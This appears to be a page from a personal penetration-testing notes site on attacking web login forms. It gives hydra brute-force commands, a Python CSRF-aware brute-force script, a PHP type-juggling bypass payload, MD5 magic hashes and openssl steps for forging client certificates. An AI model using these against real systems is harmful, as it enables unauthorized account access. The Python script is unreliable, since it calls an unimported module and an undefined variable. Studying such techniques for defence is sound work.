@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Login Panes | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="Login Panes" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="We can find some login panes that we want to bypass or bruteforce. Here you can find some amazing tricks." />
+<meta property="og:description" content="We can find some login panes that we want to bypass or bruteforce. Here you can find some amazing tricks." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/web/login-panes/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/web/login-panes/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"We can find some login panes that we want to bypass or bruteforce. Here you can find some amazing tricks.","url":"http://0.0.0.0:4000/hackingnotes/web/login-panes/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Login Panes","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Web</h2>
+				<h3>Login Panes</h3>
+			</div>
+			<article class="content">
+				<p>We can find some login panes that we want to bypass or bruteforce. Here you can find some amazing tricks.</p>
+
+<h1 id="bruteforce-it">Bruteforce it!</h1>
+
+<h2 id="hydra">Hydra</h2>
+
+<p>hydra is a powerful network service attack tool that attacks a variety of protocol authentication schemes, including SSH and HTTP.</p>
+
+<h3 id="post-forms">POST Forms</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra &lt;ip-addr&gt; -l user -P passwords.txt -s &lt;port&gt; -vV -f http-form-post "/index.php:user=^USER^&amp;password=^PASS^:Invalid Credentials"
+
+-l user
+-L user wordlist
+-p password
+-P password wordlist
+</code></pre></div></div>
+
+<h2 id="basic-auth">Basic Auth</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra &lt;ip-addr&gt; -l user -P passwords.txt -s &lt;port&gt; -vV -f http-get /index.php
+</code></pre></div></div>
+
+<h2 id="my-own-script">My own script</h2>
+
+<p>I made my own script in order to bruteforce some login panes with CSRF protection. I think is a good alternative to the Burpsuite <strong>Pitchfork attack.</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">codecs</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="c1"># Get CRSF TOKEN
+</span><span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://WEBPAGE.LOCAL/"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">regex</span> <span class="o">=</span> <span class="s">'&lt;input type="hidden" name="csrf" value="(.*)"'</span>
+<span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="n">codecs</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="s">"/usr/share/wordlists/rockyou.txt"</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">)</span> <span class="k">as</span> <span class="n">wordlist</span><span class="p">:</span>
+	<span class="n">dic</span> <span class="o">=</span> <span class="n">wordlist</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+	<span class="k">for</span> <span class="n">pwd</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
+
+		<span class="c1">#Bruteforce
+</span>		<span class="n">data_post</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">"csrf"</span> <span class="p">:</span> <span class="n">token</span><span class="p">,</span>
+			<span class="s">"username"</span> <span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
+			<span class="s">"password"</span> <span class="p">:</span> <span class="n">pwd</span><span class="p">,</span>
+		<span class="p">}</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"[!] Trying: "</span> <span class="o">+</span> <span class="n">pwd</span><span class="p">)</span>
+		<span class="n">resp2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://WEBPAGE.LOCAL/login"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data_post</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+		<span class="k">if</span> <span class="s">"permission_denied"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">resp2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+			<span class="k">print</span><span class="p">(</span><span class="s">"Username = "</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"Password = "</span> <span class="o">+</span> <span class="n">pwd</span><span class="p">)</span>
+			<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>	
+</code></pre></div></div>
+
+<h1 id="bypass-it">Bypass it!</h1>
+
+<p>The are very different methods to bypass a login pane, this are the most common ones.</p>
+
+<h2 id="sqli">SQLi</h2>
+
+<p>There are more info to bypass login panes with SQL Injections in:</p>
+
+<ul>
+  <li><a href="../sqli/">sqli.md</a></li>
+</ul>
+
+<h2 id="php-type-juggling-">PHP Type Juggling (==)</h2>
+
+<p>How PHP’s type comparison features lead to vulnerabilities and in that case to bypass the login. Loose comparisons (==) have a set of operand conversion rules to make it easier for developers.</p>
+
+<p>Let’s check the differences between Strict comparisons (===) and Loose comparisons (==).</p>
+
+<p><img src="/hackingnotes/images/phpstrict.png" alt="PHP Strict comparison" /></p>
+
+<p><img src="/hackingnotes/images/phploose.png" alt="PHP Loose comparison" /></p>
+
+<p>When we find some code like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if($_POST['password'] == "secretpass")
+</code></pre></div></div>
+
+<p>Instead of send a string we send an array we will bypass the login:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin&amp;password[]=
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf</a></li>
+</ul>
+
+<h3 id="magic-hashes">Magic Hashes</h3>
+
+<p>This particular implication for password hashes wen the operator equals-equals(==) is used. The problem is in == comparison, the 0e means that if the following characters are all digits the whole string gets treated as a float. Below is a list of hash types that when hashed are ^0+ed*$ which equates to zero in PHP when magic hashes typing using the “==” operator is applied. That means that when a password hash starts with “0e…” as an example it will always appear to match the below strings, regardless of what they actually are if all of the subsequent characters are digits from “0-9”.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># MD5
+240610708 - 0e462097431906509019562988736854
+QNKCDZO   - 0e830400451993494058024219903391
+aabg7XSs  - 0e087386482136013740957780965295
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://www.whitehatsec.com/blog/magic-hashes/">https://www.whitehatsec.com/blog/magic-hashes/</a></li>
+</ul>
+
+<h1 id="client-certificates">Client Certificates</h1>
+
+<p><strong>SSL/TLS</strong> certificates are commonly used for both encryption and identification of the parties, sometimes this is used instead of credentials at login.</p>
+
+<h2 id="setting-up-the-private-key-and-the-certificate-server">Setting up the private key and the certificate (Server)</h2>
+
+<p>First of all, we need to generate our keys and certificates. We use the <code class="highlighter-rouge">openssl</code> command-line tool.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -x509 -newkey rsa:4096 -keyout server_key.pem -out server_cert.pem -nodes -days 365 -subj "/CN=localhost/O=Client\ Certificate\ Demo"
+</code></pre></div></div>
+
+<h2 id="setting-up-client-certificates">Setting up client certificates</h2>
+
+<p>To create a key and a Certificate Signing Request for Alice and Bob we can use the following command:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -newkey rsa:4096 -keyout alice_key.pem -out alice_csr.pem -nodes -days 365 -subj "/CN=Alice"
+openssl req -newkey rsa:4096 -keyout bob_key.pem -out bob_csr.pem -nodes -days 365 -subj "/CN=Bob"
+</code></pre></div></div>
+
+<h3 id="server-signed-certificate">Server Signed Certificate:</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl x509 -req -in alice_csr.pem -CA server_cert.pem -CAkey server_key.pem -out alice_cert.pem -set_serial 01 -days 365
+</code></pre></div></div>
+
+<p>Maybe during the pentest we found the server key, remember that <strong>we can download the server certificate</strong> with the browser.</p>
+
+<p><img src="/hackingnotes/images/cert.png" alt="" /></p>
+
+<h3 id="self-signed-certificate">Self-Signed Certificate:</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl x509 -req -in bob_csr.pem -signkey bob_key.pem -out bob_cert.pem -days 365
+</code></pre></div></div>
+
+<h2 id="trying-to-get-in">Trying to get in</h2>
+
+<p>To use these certificates in our browser or via curl, we need to bundle them in PKCS#12 format.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 -export -clcerts -in alice_cert.pem -inkey alice_key.pem -out alice.p12
+openssl pkcs12 -export -in bob_cert.pem -inkey bob_key.pem -out bob.p12
+</code></pre></div></div>
+
+<h3 id="via-browser">Via Browser</h3>
+
+<p><code class="highlighter-rouge">Settings -&gt; Privacy &amp; Security -&gt; Security -&gt; Certificates -&gt; View Certificates... -&gt; Your Certificates -&gt; Import</code></p>
+
+<p><img src="/hackingnotes/images/importcert.png" alt="" /></p>
+
+<h3 id="via-curl">Via Curl</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --insecure --cert mvc1009.p12 --cert-type p12 https://localhost:443/
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326">https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326</a></li>
+</ul>
+
+<h1 id="references">References:</h1>
+
+<ul>
+  <li><a href="https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/">https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/</a></li>
+  <li><a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp">https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp</a></li>
+  <li><a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf</a></li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
